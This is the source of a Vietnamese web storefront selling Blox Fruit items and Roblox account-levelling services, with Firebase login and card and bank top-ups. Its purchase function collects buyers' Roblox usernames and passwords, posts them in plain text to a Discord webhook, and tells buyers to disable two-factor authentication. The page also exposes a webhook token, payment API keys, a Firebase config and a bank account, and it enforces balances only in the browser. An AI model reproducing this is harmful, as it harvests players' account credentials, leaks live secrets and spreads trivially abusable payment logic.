<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BAP SHOP - BLOX FRUIT PREMIUM</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Plus+Jakarta+Sans:wght@300;600;800&display=swap');
        :root { --primary: #00f2ff; --accent: #ff0055; --bg: #080a0f; }
        body { background-color: var(--bg); color: #ffffff; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; }
        .font-cyber { font-family: 'Orbitron', sans-serif; }
        .glass-panel { background: rgba(15, 20, 28, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(0, 242, 255, 0.1); border-radius: 24px; }
        .btn-cyber { background: linear-gradient(90deg, var(--primary), #0066ff); transition: 0.3s; cursor: pointer; border: none; }
        .btn-cyber:hover { transform: translateY(-3px); box-shadow: 0 0 20px rgba(0, 242, 255, 0.5); }
        .tab-active { color: var(--primary) !important; border-bottom: 3px solid var(--primary); }
        .modal-active { display: flex !important; }
        .card-item:hover { border-color: var(--primary); background: rgba(0, 242, 255, 0.05); }
    </style>
</head>
<body class="pb-20">

    <nav class="sticky top-0 z-[1000] bg-slate-950/80 backdrop-blur-xl border-b border-white/5 px-6 py-5 flex justify-between items-center">
        <div class="flex items-center gap-3 cursor-pointer" onclick="location.reload()">
            <div class="w-10 h-10 bg-gradient-to-tr from-cyan-500 to-blue-600 rounded-xl flex items-center justify-center font-cyber font-black text-xl shadow-[0_0_15px_rgba(6,182,212,0.5)]">B</div>
            <h1 class="text-2xl font-cyber font-black tracking-tighter uppercase">BAP<span class="text-cyan-400">SHOP</span></h1>
        </div>
        <div id="auth-section">
            <button id="auth-btn" onclick="openForm('auth')" class="btn-cyber text-black px-8 py-2.5 rounded-full font-black text-[11px] uppercase tracking-widest">ƒêƒÉng Nh·∫≠p</button>
            <div id="user-info" class="hidden flex items-center gap-4">
                <div class="text-right"><p id="display-name" class="text-[10px] font-black uppercase text-slate-400"></p><p class="text-cyan-400 font-cyber font-bold text-sm"><span id="balance">0</span>ƒë</p></div>
                <button onclick="auth.signOut().then(()=>location.reload())" class="bg-white/5 p-2.5 rounded-xl hover:text-red-500 transition">Tho√°t</button>
            </div>
        </div>
    </nav>

    <main class="max-w-6xl mx-auto px-6 mt-10">
        <div class="glass-panel p-8 mb-12 border-l-8 border-l-cyan-500">
            <h2 class="text-4xl font-cyber font-black mb-2 italic uppercase">Blox Fruit <span class="text-cyan-400">Premium</span></h2>
            <p class="text-slate-400 font-medium tracking-wide">D·ªãch v·ª• c√†y thu√™ & v·∫≠t ph·∫©m game an to√†n b·∫≠c nh·∫•t c·ªßa Admin Nghƒ©a.</p>
        </div>

        <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-12">
            <div onclick="openForm('card')" class="glass-panel p-6 flex items-center gap-6 cursor-pointer hover:bg-white/5 transition">
                <div class="text-3xl">üí≥</div>
                <div><h3 class="font-black uppercase text-sm mb-1">N·∫°p Th·∫ª C√†o</h3><p class="text-[10px] text-slate-500 font-bold uppercase">T·ª± ƒë·ªông c·ªông ti·ªÅn</p></div>
            </div>
            <div onclick="openForm('bank')" class="glass-panel p-6 flex items-center gap-6 cursor-pointer hover:bg-white/5 transition">
                <div class="text-3xl">üè¶</div>
                <div><h3 class="font-black uppercase text-sm mb-1">ATM / MOMO / QR</h3><p class="text-[10px] text-slate-500 font-bold uppercase">N·∫°p nhanh 100% gi√° tr·ªã</p></div>
            </div>
        </div>

        <div class="flex gap-10 mb-10 border-b border-white/5">
            <button onclick="showTab('fruit')" id="btn-fruit" class="tab-active py-4 font-black uppercase text-xs tracking-[2px] cursor-pointer">Tr√°i Vƒ©nh Vi·ªÖn</button>
            <button onclick="showTab('gp')" id="btn-gp" class="py-4 font-black uppercase text-xs tracking-[2px] text-slate-500 cursor-pointer">Gamepass</button>
            <button onclick="showTab('ct')" id="btn-ct" class="py-4 font-black uppercase text-xs tracking-[2px] text-slate-500 cursor-pointer text-cyan-400">C√†y Thu√™ üî•</button>
        </div>

        <div id="fruit-list" class="grid grid-cols-2 md:grid-cols-4 gap-6"></div>
        <div id="gp-list" class="hidden grid grid-cols-2 md:grid-cols-4 gap-6"></div>
        <div id="ct-list" class="hidden grid grid-cols-1 md:grid-cols-2 gap-6"></div>
    </main>

    <div id="modal-card" class="fixed inset-0 bg-black/95 z-[2000] hidden items-center justify-center p-4">
        <div class="glass-panel bg-slate-900 p-8 w-full max-w-sm border-t-4 border-t-cyan-500">
            <h2 class="font-cyber text-xl text-center text-cyan-400 mb-6 uppercase">N·∫°p th·∫ª t·ª± ƒë·ªông</h2>
            <div class="space-y-4">
                <select id="card-type" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl font-bold text-white outline-none"><option value="VIETTEL">VIETTEL</option></select>
                <select id="card-amount" onchange="calcTax()" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl font-bold text-white outline-none">
                    <option value="10000">10,000ƒë</option><option value="20000">20,000ƒë</option><option value="50000">50,000ƒë</option><option value="100000">100,000ƒë</option>
                </select>
                <div class="bg-cyan-500/10 p-3 rounded-xl border border-cyan-500/20 text-center text-cyan-400 font-black">
                    <span class="text-[9px] block text-slate-500">TH·ª∞C NH·∫¨N (SAU THU·∫æ 20%)</span>
                    <span id="tax-result">8,000ƒë</span>
                </div>
                <input id="card-seri" placeholder="S·ªê SERI" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl font-bold outline-none">
                <input id="card-pin" placeholder="M√É TH·∫∫" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl font-bold outline-none">
                <button onclick="sendCard()" class="btn-cyber w-full py-4 rounded-xl font-black uppercase text-black">G·ª≠i Th·∫ª Ngay</button>
                <button onclick="closeAll()" class="w-full text-slate-500 text-[10px] font-bold uppercase mt-2">ƒê√≥ng</button>
            </div>
        </div>
    </div>

    <div id="modal-buy" class="fixed inset-0 bg-black/95 z-[2000] hidden items-center justify-center p-4">
        <div class="glass-panel bg-slate-900 p-8 w-full max-w-sm border-t-4 border-t-pink-500">
            <h2 id="buy-title" class="font-cyber text-xl text-center text-pink-500 mb-6 uppercase"></h2>
            <div class="space-y-4">
                <input id="buy-acc" placeholder="T√ÄI KHO·∫¢N ROBLOX" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl font-bold outline-none">
                <input id="buy-pass" type="password" placeholder="M·∫¨T KH·∫®U" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl font-bold outline-none">
                <p id="ct-note" class="hidden text-[10px] text-yellow-500 font-bold text-center">T·∫ÆT 2FA TR∆Ø·ªöC KHI MUA!</p>
                <button onclick="processBuy()" class="btn-cyber w-full py-4 rounded-xl font-black uppercase text-black">X√°c Nh·∫≠n Mua</button>
                <button onclick="closeAll()" class="w-full text-slate-500 text-[10px] font-bold text-center mt-2 uppercase">H·ªßy</button>
            </div>
        </div>
    </div>

    <div id="modal-auth" class="fixed inset-0 bg-black/98 z-[2000] hidden items-center justify-center p-4">
        <div class="glass-panel p-10 w-full max-w-sm text-center">
            <h2 class="font-cyber text-2xl mb-8 uppercase tracking-widest">Login</h2>
            <input id="auth-u" placeholder="Username" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl mb-4 font-bold outline-none">
            <input id="auth-p" type="password" placeholder="Password" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl mb-6 font-bold outline-none">
            <button onclick="handleLogin()" class="btn-cyber w-full py-4 rounded-xl font-black text-black uppercase">V√†o Shop</button>
            <p onclick="handleRegister()" class="text-slate-500 text-[10px] font-black cursor-pointer hover:text-cyan-400 mt-4 uppercase">ƒêƒÉng k√Ω ngay</p>
        </div>
    </div>

    <div id="modal-bank" class="fixed inset-0 bg-black/95 z-[2000] hidden items-center justify-center p-4">
        <div class="glass-panel p-8 w-full max-w-sm text-center">
            <h2 class="font-cyber text-xl text-cyan-400 mb-6">QU√âT QR N·∫†P TI·ªÄN</h2>
            <img src="https://i.postimg.cc/N0tWGcvJ/74b766b2-91f0-441c-95da-71b054c4a8c2.jpg" class="w-60 mx-auto rounded-3xl mb-6 border border-cyan-500/20 shadow-2xl">
            <div class="text-left bg-white/5 p-4 rounded-2xl mb-6 font-bold text-[11px]">
                <p>AGRIBANK: 228205353447</p><p>CH·ª¶ TK: LY THI HOA</p>
            </div>
            <button onclick="baoDaBank()" class="w-full bg-white text-black py-4 rounded-xl font-black uppercase">T√¥i ƒë√£ chuy·ªÉn ti·ªÅn</button>
        </div>
    </div>

    <script>
        // --- üõ† ƒêI·ªÄN TH√îNG TIN C·ª¶A NGHƒ®A ·ªû ƒê√ÇY üõ† ---
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1467138431380623615/KxzLu2aos7455VXv-qOogLkoTC-c1XBJH7bJawv2eblGrxyY6vRDxVsBCdziIuOUB6g3";
        const NP_ID = "9565963734"; // Nghƒ©a thay ID c·ªßa b·∫°n
        const NP_KEY = "80df3668af04f2a85e1befc277896513"; // Nghƒ©a thay Key c·ªßa b·∫°n

        const firebaseConfig = { apiKey: "AIzaSyA5wBS88oS54yLs0OfwDYDfDQeTjc6ccdM", authDomain: "shop-blox-fruit-trannghia.firebaseapp.com", projectId: "shop-blox-fruit-trannghia", databaseURL: "https://shop-blox-fruit-trannghia-default-rtdb.firebaseio.com" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database(), auth = firebase.auth();

        const products = {
            fruit: [
                {n:"Kitsune VV", p:690000, img:"https://i.postimg.cc/5yHRjSfH/Anh-chup-man-hinh-2026-01-28-113329.png"},
                {n:"Dragon VV", p:750000, img:"https://i.postimg.cc/CLB3KS1g/Anh-chup-man-hinh-2026-01-28-113307.png"},
                {n:"Dough VV", p:350000, img:"https://i.postimg.cc/DwfC5k93/Anh-chup-man-hinh-2026-01-28-113404.png"}
            ],
            gp: [
                {n:"Dark Blade", p:200000, img:"https://i.postimg.cc/d0LH59yQ/Anh-chup-man-hinh-2026-01-28-113612.png"},
                {n:"X2 Mastery", p:80000, img:"https://i.postimg.cc/c1N9M0fL/Anh-chup-man-hinh-2026-01-28-113626.png"}
            ],
            ct: [
                {n:"C√†y Level 1-2800", p:20000},
                {n:"L·∫•y V√µ V2 (Full Chi√™u)", p:30000},
                {n:"Th·ª©c T·ªânh Tr√°i V2", p:20000},
                {n:"Up V4 Full Gare", p:50000}
            ]
        };

        function calcTax() {
            const val = document.getElementById('card-amount').value;
            document.getElementById('tax-result').innerText = (val * 0.8).toLocaleString() + "ƒë";
        }

        function render() {
            ['fruit', 'gp'].forEach(tab => {
                document.getElementById(tab+'-list').innerHTML = products[tab].map((p, i) => `
                    <div class="glass-panel p-4 text-center card-item transition">
                        <img src="${p.img}" class="w-full aspect-square object-cover rounded-2xl mb-4">
                        <h4 class="font-black text-[10px] uppercase mb-1 text-slate-300">${p.n}</h4>
                        <p class="text-cyan-400 font-cyber text-lg font-bold mb-4">${p.p.toLocaleString()}ƒë</p>
                        <button onclick="openBuy('${tab}', ${i})" class="btn-cyber text-black py-2.5 w-full rounded-xl font-black text-[10px] uppercase">Giao D·ªãch</button>
                    </div>`).join('');
            });
            document.getElementById('ct-list').innerHTML = products.ct.map((p, i) => `
                <div class="glass-panel p-6 flex items-center justify-between card-item">
                    <div><h4 class="font-black text-sm uppercase text-white">${p.n}</h4><p class="text-slate-500 text-[10px] font-bold italic">‚ö° T·ªëc ƒë·ªô cao</p></div>
                    <div class="flex items-center gap-4"><p class="text-xl font-cyber font-black text-white italic">${p.p.toLocaleString()}ƒë</p>
                    <button onclick="openBuy('ct', ${i})" class="btn-cyber text-black px-6 py-2.5 rounded-xl font-black text-[10px] uppercase">Mua</button></div>
                </div>`).join('');
        }
        render();

        // --- H√ÄM N·∫†P TH·∫∫ T·ª∞ ƒê·ªòNG ---
        async function sendCard() {
            const type = document.getElementById('card-type').value;
            const amount = document.getElementById('card-amount').value;
            const seri = document.getElementById('card-seri').value;
            const pin = document.getElementById('card-pin').value;
            if(!seri || !pin) return alert("Vui l√≤ng nh·∫≠p ƒë·ªß th√¥ng tin th·∫ª!");
            if(!auth.currentUser) return openForm('auth');

            const apiURL = `https://doithe1s.vn/api/card-auto.php?type=${type}&amount=${amount}&pin=${pin}&seri=${seri}&partner_id=${NP_ID}&partner_key=${NP_KEY}&request_id=${Math.random()}&content=${auth.currentUser.uid}`;
            
            try {
                fetch(apiURL); // G·ª≠i API g·∫°ch th·∫ª
                alert("ƒê√£ g·ª≠i th·∫ª! Ti·ªÅn s·∫Ω ƒë∆∞·ª£c c·ªông t·ª± ƒë·ªông n·∫øu th·∫ª ƒë√∫ng.");
                fetch(DISCORD_WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: `üí≥ **N·∫†P TH·∫∫:** ${auth.currentUser.uid} v·ª´a n·∫°p ${type} ${amount}ƒë` }) });
                closeAll();
            } catch(e) { alert("L·ªói API!"); }
        }

        // --- H√ÄM MUA & DISCORD ---
        let curItem = {};
        function openBuy(tab, i) { 
            if(!auth.currentUser) return openForm('auth'); 
            curItem = products[tab][i]; 
            document.getElementById('buy-title').innerText = curItem.n; 
            document.getElementById('ct-note').style.display = (tab === 'ct') ? "block" : "none"; 
            openForm('buy'); 
        }

        async function processBuy() {
            const acc = document.getElementById('buy-acc').value, pass = document.getElementById('buy-pass').value;
            if(!acc || !pass) return alert("Nh·∫≠p t√†i kho·∫£n & m·∫≠t kh·∫©u!");
            const snap = await db.ref('users/' + auth.currentUser.uid).get();
            const bal = snap.val().balance || 0;
            if(bal < curItem.p) return alert("B·∫°n kh√¥ng ƒë·ªß ti·ªÅn!");
            
            await db.ref('users/' + auth.currentUser.uid).update({ balance: bal - curItem.p });
            fetch(DISCORD_WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: `üî• **ƒê∆†N M·ªöI:** ${curItem.n} | Kh√°ch: ${snap.val().username} | TK: \`${acc}\` | MK: \`${pass}\`` }) });
            alert("Mua th√†nh c√¥ng! Check Discord admin x·ª≠ l√Ω nh√© Nghƒ©a."); closeAll();
        }

        function openForm(id) { closeAll(); document.getElementById('modal-'+id).classList.add('modal-active'); }
        function closeAll() { document.querySelectorAll('.fixed').forEach(m => m.classList.remove('modal-active')); }
        function showTab(t) { 
            ['fruit','gp','ct'].forEach(id => { document.getElementById(id+'-list').classList.add('hidden'); document.getElementById('btn-'+id).classList.remove('tab-active'); }); 
            document.getElementById(t+'-list').classList.remove('hidden'); document.getElementById('btn-'+t).classList.add('tab-active'); 
        }
        auth.onAuthStateChanged(u => { if(u) { document.getElementById('auth-btn').classList.add('hidden'); document.getElementById('user-info').classList.remove('hidden'); db.ref('users/'+u.uid).on('value', s => { document.getElementById('display-name').innerText = s.val().username; document.getElementById('balance').innerText = (s.val().balance || 0).toLocaleString(); }); } });
        async function handleLogin() { const u = document.getElementById('auth-u').value.toLowerCase(), p = document.getElementById('auth-p').value; try { await auth.signInWithEmailAndPassword(u+"@bap.shop", p); location.reload(); } catch(e) { alert("Sai m·∫≠t kh·∫©u!"); } }
        async function handleRegister() { const u = document.getElementById('auth-u').value.toLowerCase(), p = document.getElementById('auth-p').value; try { const r = await auth.createUserWithEmailAndPassword(u+"@bap.shop", p); await db.ref('users/'+r.user.uid).set({username: u, balance: 0}); location.reload(); } catch(e) { alert("L·ªói!"); } }
        async function baoDaBank() { const m = prompt("Ti·ªÅn ƒë√£ n·∫°p?"); if(m) { await db.ref('nap_bank').push({ uid: auth.currentUser.uid, amount: m }); alert("ƒê√£ b√°o admin!"); closeAll(); } }
    </script>
</body>
</html>
